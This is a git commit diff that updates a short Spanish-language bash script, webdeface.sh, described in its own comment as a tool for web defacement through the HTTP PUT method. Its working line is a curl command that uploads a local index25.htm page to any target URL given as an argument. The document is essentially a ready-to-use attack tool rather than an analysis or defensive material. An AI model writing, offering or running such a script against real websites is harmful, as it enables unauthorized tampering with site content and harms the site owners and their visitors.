7d364e957e1f029dec42723aa0652dabf2d5fcd9
hackingyseguridad <antonio_taboada@hotmail.es>
2025-04-20 18:41:39 +0200

    Update webdeface.sh

--- webdeface.sh
+++ webdeface.sh
@@ -1,8 +1,10 @@
-
-
+#!/bin/bash
+# Simple bash para explotar web defacement por metodo PUT
+#
+echo "..."
 echo 
-echo " Web deface por metodo http PUT "
-echo " Se requiere index25.htm em la misma carpeta donde esta esta script "
+echo "Web deface por metodo http PUT "
+echo "Se requiere index25.htm em la misma carpeta donde esta esta script "
 echo "Uso.: sh webdeface.sh URL "  
 echo 
 curl -v -X PUT $1/index25.htm -d @index25.htm
